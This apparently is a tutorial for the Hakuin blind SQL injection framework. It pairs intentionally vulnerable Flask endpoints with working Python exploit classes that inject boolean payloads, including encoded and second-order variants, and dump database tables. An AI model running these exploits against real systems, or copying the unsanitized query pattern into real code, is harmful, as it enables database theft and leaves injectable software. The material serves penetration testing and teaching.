In this tutorial, we introduce Hakuin's most common features and show you how to use it to handle a variety of challenges you may encounter while exploiting BSQLI.


#### Basic Concepts
Consider a simple Flask application with the following endpoint:
```python
@app.route('/users')
def users():
    name = request.args['name']
    query = f'SELECT * FROM users WHERE name="{name}"'
    
    with DB.connect() as conn:
        user = conn.execute(text(query)).fetchone()[0]

    if user:
        return 'found', 200
    return 'oops', 404
```

The `name` parameter is not sanitized, so the endpoint is vulnerable to BSQLI.

To exploit the vulnerability, you need to instruct Hakuin on how to inject its queries. This is done by deriving the `Requester` class and overriding the `request` method. Aside from injecting queries, the method must determine whether they resolved to `True` or `False`.
```python
from hakuin import Requester

class SimpleRequester(Requester):
    async def request(self, query, ctx):
        # inject the query
        payload = query.render(ctx)
        url = f'http://target.com/users?search=XXX" OR ({payload}) --'
        async with aiohttp.request('GET', url) as resp:
            # determine the query result
            return resp.status == 200
```

Pay attention to the glue code in `search=XXX" OR ({payload})`. The`XXX"` part escapes the string literal in `WHERE name="{name}"`, the `--` turns the extra `"` into a comment to avoid breaking the SQL syntax, and the `OR ({payload})` ensures the SQL statement resolves to true if the payload is logically true and vice versa. There are many ways to glue the payload to the SQL statement, be creative!

Also, notice that there are many ways to infer the boolean result of the injected query. In the example above, we checked, whether the `resp.status == 200`, but we could just as well check whether the response includes the string `"found"`.

Now that everything is set, we can start dumping the database (DB). This is done via the `Extractor` class. The `Extractor` requires a `Requester` and the name of the DB management system (DBMS) it should generate queries for. Hakuin currently supports SQLite, MySQL, Postgres, MsSQL, and Oracle (experimental), but will soon include more engines.

Extracting table names can look like this.
```python
import asyncio
import aiohttp
from hakuin import Extractor, Requester

class SimpleRequester(Requester):
    ...

async def main():
    requester = SimpleRequester():
    ext = Extractor(requester=requester, dbms='sqlite')
    data = await ext.extract_table_names()
    print(data)

asyncio.run(main())
```

Although simple, this approach can be used to exploit most BSQLI vulnerabilities. Keep reading.


#### Transforming Payloads
Let's spice things up. Look at the endpoint bellow.
```python
@app.route('/users')
def users():
    data = request.args['data']
    data = base64.b64decode(data).decode()
    name = json.loads(data)['name']
    query = f'SELECT * FROM users WHERE name="{name}"'
    ...
```

Again, the endpoint is vulnerable, but this time the user input goes through a series of transformations before it is inserted into the SQL statement.

The challenge here is to correctly prepare the input to hit the vulnerability. An example exploit is shown below.
```python
class RequesterWithTransformations(Requester):
    async def request(self, query, ctx):
        payload = query.render(ctx)
        data = json.dumps({'name': f'XXX" OR ({payload}) --'})
        data = base64.b64encode(data.encode())
        url = f'http://target.com/users?data={data}'
        async with aiohttp.request('GET', url) as resp:
            return resp.status == 200
```



#### Higher Order Injection Vulnerabilities
Sometimes, the vulnerable endpoint is not the same as the one used to upload payloads. See these endpoints:
```python
SESSION = {
    'name': None,
}

@app.route('/register', methods=['POST'])
def register():
    SESSION['name'] = request.args['name']

@app.route('/profile')
def register():
    name = SESSION['name']
    query = f'SELECT * FROM users WHERE name="{name}"'
    
    with DB.connect() as conn:
        user = conn.execute(text(query)).fetchone()[0]

    if user:
        return 'found', 200
    return 'oops', 404
```

Here, the user provided `name` is stored on the server via the `/register` endpoint and only then it is inserted into the SQL statement via `/profile`.

This second-order vulnerability can be exploited with the following code:
```python
class SecondOrderRequester(Requester):
    async def request(self, query, ctx):
        # upload payload
        payload = query.render(ctx)
        url = f'http://target.com/register?name=XXX" OR ({payload}) --'
        async with aiohttp.request('post', url):
            pass

        # hit the vulnerable endpoint and infer the result
        url = 'http://target.com/profile'
        async with aiohttp.request('get', url) as resp:
            return resp.status == 200
```


#### More Tutorials Coming Soon
So far, we only explained how to customize the injection and inference logic, but Hakuin allows you to customize everything, even the query generation and extraction logic. We will cover these topics soon.

Additionally, we are writing a high-level overview of the optimization methods used by Hakuin under the hood. The document will be published once ready. Stay tuned.